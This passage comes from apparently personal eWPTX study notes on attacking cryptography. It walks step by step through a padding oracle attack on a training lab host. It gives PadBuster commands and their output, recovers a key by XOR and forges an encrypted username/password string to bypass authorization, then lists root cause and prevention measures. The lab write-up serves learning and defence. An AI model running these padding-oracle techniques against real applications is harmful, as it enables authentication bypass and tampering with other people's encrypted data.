+<blockquote>
+  <p>To get the first block, we would need the IV.</p>
+</blockquote>
+
+<p>Step 8: Recreate the missing parameter and obtain the key.</p>
+
+<p>Visit the /check endpoint and provide the ciphertext, and it will give back the complete details about the encrypted string:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>URL: http://demo.ine.local/check?cipher<span class="o">=</span>6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80
+</code></pre></div></div>
+
+<p>The decrypted as well as the parsed content is shown in the response.</p>
+
+<ul>
+  <li>We now know that the full parameter name is ApplicationUsername. This should be the content of the first, previously not decrypted, block 6b664ef0359fe233e021ad36b12d8e32.</li>
+</ul>
+
+<p>So far, we know that we have three blocks:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>6b664ef0359fe233e021ad36b12d8e32 -&gt; ApplicationUsern
+b8f1335522753d45174435c16b52dc2e -&gt; <span class="nv">ame</span><span class="o">=</span>user&amp;Passwor
+5bbd4363b9d91d4c9100beae6ce34e80 -&gt; <span class="nv">d</span><span class="o">=</span>sesame
+</code></pre></div></div>
+
+<blockquote>
+  <p>To obtain the key, we need to run <strong>Padbuster</strong> with the following arguments:</p>
+</blockquote>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>padbuster <span class="s2">"http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32"</span> <span class="s2">"6b664ef0359fe233e021ad36b12d8e32"</span> 16 <span class="nt">-encoding</span> 1 <span class="nt">-error</span> <span class="s2">"ApplicationUsername missing"</span> <span class="nt">-prefix</span> <span class="s2">"6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e"</span> <span class="nt">-noiv</span>
+</code></pre></div></div>
+
+<p>The reason for these arguments is the following:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- We use just the first block of the whole encrypted string - the one that was not decrypted
+- Next, we specify 16 bytes as the block size and lowercase hex encoding
+- error tells the application what string to look <span class="k">for in </span>the response page to treat it as the error <span class="o">(</span>we could have identified that error message by requesting something like http://demo.ine.local/check?cipher<span class="o">=</span>6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34eff and the response would indicate of the invalid padding<span class="o">)</span>
+- noiv is used to get the intermediate value after decrypting the first block.
+</code></pre></div></div>
+
+<p>Obtaining the key will look as follows:</p>
+
+<p>Block 1 Results:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Cipher Text <span class="o">(</span>HEX<span class="o">)</span>: 6b664ef0359fe233e021ad36b12d8e32
+<span class="o">[</span>+] Intermediate Bytes <span class="o">(</span>HEX<span class="o">)</span>: 221449095f050045505c5e671003460d
+<span class="o">[</span>+] Plain Text: <span class="s2">"I      _EP</span><span class="se">\^</span><span class="s2">gF
+</span></code></pre></div></div>
+
+<p>Step 10: Retrieving the signing key.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>To get the key, we need to XOR the hex representation of the ciphertext <span class="o">(</span>Intermediate bytes - hex <span class="k">for</span> <span class="s2">"I _EP</span><span class="se">\^</span><span class="s2">gF) with the hex representation of "</span>ApplicationUsern<span class="s2">", which is 0x4170706c69636174696f6e557365726e.
+
+# Visit a XOR calculator website like https://xor.pw:
+</span></code></pre></div></div>
+
+<p>Provide the following hex values in the input fields:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Input 1: 4170706c69636174696f6e557365726e
+Input 2: 221449095f050045505c5e671003460d
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The result is 0x63643965366661313933303263663463, which translates to cd9e6fa19302cf4c <span class="k">in </span>ASCII <span class="o">(</span>coverted using https://www.rapidtables.com/convert/number/hex-to-ascii.html<span class="o">)</span>:
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Signing Key: cd9e6fa19302cf4c
+</code></pre></div></div>
+
+<p>Step 11: Craft a custom username and password.</p>
+
+<p>To make the application receive <strong>authorization</strong> as the username and <strong>bypass</strong> as the password, we would provide similar arguments to PadBuster, as before, like the ones set to obtain the encryption key.</p>
+
+<ul>
+  <li>PadBuster’s base will be the first block with the prefix and the same error indicator. The only addition is padding to the plaintext to close the “previous” argument when encrypting (we need data in the below format):</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">Application_garbage_data</span><span class="o">=</span>xyz&amp;ApplicationUsername<span class="o">=</span>authorization&amp;Password<span class="o">=</span>bypass
+</code></pre></div></div>
+
+<p>Note that <strong>=xyz</strong> can be replaced with =anything&amp; as we just want to <strong>close</strong> the first argument in the GET request. Otherwise, all the encrypted data would be understood by the application as the value of the previous parameter and would not be treated as username and password values:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>padbuster <span class="s2">"http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32"</span> <span class="s2">"6b664ef0359fe233e021ad36b12d8e32"</span> 16 <span class="nt">-encoding</span> 1 <span class="nt">-error</span> <span class="s2">"ApplicationUsername missing"</span> <span class="nt">-prefix</span> <span class="s2">"6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e"</span> <span class="nt">-plaintext</span> <span class="s2">"=xyz&amp;ApplicationUsername=authorization&amp;Password=bypass"</span>
+</code></pre></div></div>
+
+<p>Once the tool finishes its work, you should get back the following output:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Encrypted value is: 5455c513e812a5bfbddfa75194573f07d4ddee7f0f8ec540644a5e38679f39ea17f4add5e45ec7f74119ade4bf6e2615ab0b799bb09f03bb7dc3260512cf1a7400000000000000000000000000000000
+</code></pre></div></div>
+
+<p>Step 12: Confirm the modification done to the username and the password.</p>
+
+<p>Send the encrypted value for authentication, to the /check endpoint:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>URL: http://demo.ine.local/check?cipher<span class="o">=</span>5455c513e812a5bfbddfa75194573f07d4ddee7f0f8ec540644a5e38679f39ea17f4add5e45ec7f74119ade4bf6e2615ab0b799bb09f03bb7dc3260512cf1a7400000000000000000000000000000000
+</code></pre></div></div>
+
+<blockquote>
+  <p>We can see that the application correctly recognized the forged username and password. In a real-life scenario, the ability to tamper with insufficiently encrypted data might result in an effective authorization bypass.</p>
+</blockquote>
+
+<p>Root Cause:</p>
+
+<p>The padding oracle attack is meant to illustrate the idea that something as innocuous as revealing whether the padding is valid or not can reveal a lot of information when abused in the right context.</p>
+
+<p>Prevention:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Use GCM/No Padding rather than CBC Padding mode.
+- Catch all decryption errors and <span class="k">return </span>generic messages instead of reporting specific padding errors.
+- Implement Encrypt-then-MAC. In <span class="k">case</span> a cipher arriving at the server was tampered with, 
+  it will be dropped before any padding information is leaked.
+- Limit requests coming from the same source.
+</code></pre></div></div>
+
+<p>Reference: https://www.youtube.com/watch?v=lkPBTJ3yiCI</p>
+
+<h3 id="references">References</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://github.com/AonCyberLabs/PadBuster
+- https://www.youtube.com/watch?v=lkPBTJ3yiCI
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#advanced" class="page__taxonomy-item" rel="tag">advanced</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ewptx" class="page__taxonomy-item" rel="tag">ewptx</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-12-04T00:00:00+06:00">December 4, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=12+-+Attacking+Crypto%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fcrypto%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fcrypto%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fcrypto%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/ewptx/serverside/" class="pagination--pager" title="11 - Server Side Attacks
+">Previous</a>
+    
+    
+      <a href="/notes/ewptx/authenticationsso/" class="pagination--pager" title="13 - Authentication &amp; SSO
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
